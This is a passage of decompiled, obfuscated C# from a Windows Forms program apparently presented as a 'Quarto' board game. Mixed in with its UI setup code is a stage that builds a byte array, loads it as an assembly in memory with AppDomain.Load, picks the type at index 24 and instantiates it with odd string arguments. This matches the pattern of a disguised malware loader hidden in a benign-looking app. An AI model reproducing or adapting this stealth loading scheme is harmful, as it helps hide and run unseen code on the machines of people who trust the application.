					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)((num2 * 1329438638) ^ 0x3CB1B335);
					continue;
				case 46u:
					num = ((int)num2 * -1742597401) ^ 0xD026FF5;
					continue;
				case 45u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)((num2 * 1332314633) ^ 0x480E54F9);
					continue;
				case 44u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -389277376) ^ 0x356359D;
					continue;
				case 43u:
					num = (int)(num2 * 696003204) ^ -2097014222;
					continue;
				case 42u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -995812740) ^ -1951202368;
					continue;
				case 41u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 540665018) ^ 0x6FD775D8);
					continue;
				case 40u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 2115974864) ^ -729718764;
					continue;
				case 39u:
					num = (int)((num2 * 401883579) ^ 0x58775D7A);
					continue;
				case 38u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -1213971528) ^ -1639183118;
					continue;
				case 37u:
					num3++;
					num = (int)((num2 * 723748985) ^ 0x60D7D283);
					continue;
				case 36u:
					num = ((int)num2 * -1136422123) ^ 0x7AAF91D0;
					continue;
				case 35u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -1167300170) ^ 0x73367AD6;
					continue;
				case 34u:
					button2 = Form1.smethod_53();
					num = (int)((num2 * 1269361045) ^ 0x52E81E50);
					continue;
				case 33u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)((num2 * 745438187) ^ 0x37BA3C9);
					continue;
				case 32u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)(num2 * 1785593217) ^ -783393673;
					continue;
				case 31u:
					num = (int)(num2 * 656940793) ^ -671507971;
					continue;
				case 30u:
					num = ((int)num2 * -1495273073) ^ -1081065050;
					continue;
				case 29u:
					num = ((int)num2 * -416937424) ^ 0xAB28808;
					continue;
				case 28u:
					num = ((int)num2 * -435392331) ^ 0x3C799911;
					continue;
				case 27u:
					num = (int)(num2 * 1364738926) ^ -1455770101;
					continue;
				case 26u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 1698109565) ^ 0x5909EAFE);
					continue;
				case 25u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)(num2 * 1218917035) ^ -2091034691;
					continue;
				case 24u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -80589681) ^ 0x1AF05D40;
					continue;
				case 23u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)((num2 * 33616946) ^ 0x25D29EEE);
					continue;
				case 22u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -1129053769) ^ 0x7C2CA4A3;
					continue;
				case 21u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1343724763) ^ -1997654912;
					continue;
				case 20u:
					timer1 = Form1.smethod_56(components);
					num = ((int)num2 * -1433321760) ^ 0x13844BE4;
					continue;
				case 19u:
					num = (int)((num2 * 1280462598) ^ 0x6C0C614D);
					continue;
				case 18u:
					num = (int)(num2 * 1367408091) ^ -521970416;
					continue;
				case 17u:
					num = ((int)num2 * -4908184) ^ -2070057071;
					continue;
				case 16u:
					num = ((int)num2 * -394762164) ^ -909761115;
					continue;
				case 15u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -485266554) ^ -1766856939;
					continue;
				case 14u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -548994514) ^ 0xB8FCDD3;
					continue;
				case 13u:
					num = ((int)num2 * -314505977) ^ 0x263ABFC9;
					continue;
				case 12u:
					num = (int)((num2 * 1107694527) ^ 0x649A576B);
					continue;
				case 11u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -1282799495) ^ -302122361;
					continue;
				case 10u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 1880434598) ^ -533722147;
					continue;
				case 9u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num = (int)(num2 * 1706259637) ^ -356687455;
					continue;
				case 8u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -258608051) ^ -1576308748;
					continue;
				case 7u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 1571903599) ^ 0x1EA3D23F);
					continue;
				case 6u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1366392712) ^ -38373996;
					continue;
				case 5u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)((num2 * 1116889702) ^ 0x41E42FD1);
					continue;
				case 4u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 482148501) ^ 0x12E58E93);
					continue;
				case 3u:
					num = ((int)num2 * -1707904496) ^ 0x5C3644F4;
					continue;
				case 2u:
					CharArray(array, string.Empty);
					num = (int)((num2 * 1221297956) ^ 0x482A39);
					continue;
				case 1u:
					num3 = 0;
					num = (int)(num2 * 1893249) ^ -728528864;
					continue;
				case 0u:
					num = ((int)num2 * -1439041908) ^ 0x197EDD11;
					continue;
				default:
					return;
				case 71u:
					break;
				case 106u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = 1554159215;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x2F6486D8u) % 5u)
				{
				case 3u:
					PerformTable(q);
					num = ((int)num2 * -511379263) ^ -235023946;
					continue;
				case 2u:
					q = ContextAdd(Level);
					num = (int)(num2 * 785042781) ^ -896141353;
					continue;
				case 1u:
					num = ((int)num2 * -812206309) ^ -1262588254;
					continue;
				default:
					return;
				case 4u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 1728769059;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1C752211u) % 3u)
				{
				case 2u:
					goto IL_0003;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = Form1.smethod_94(Form1.smethod_93(), Position);
				num = ((int)num2 * -1170718485) ^ -1119657226;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = -1040535483;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xFFDFE148u) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = ((int)num2 * -1666071994) ^ -1579281236;
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
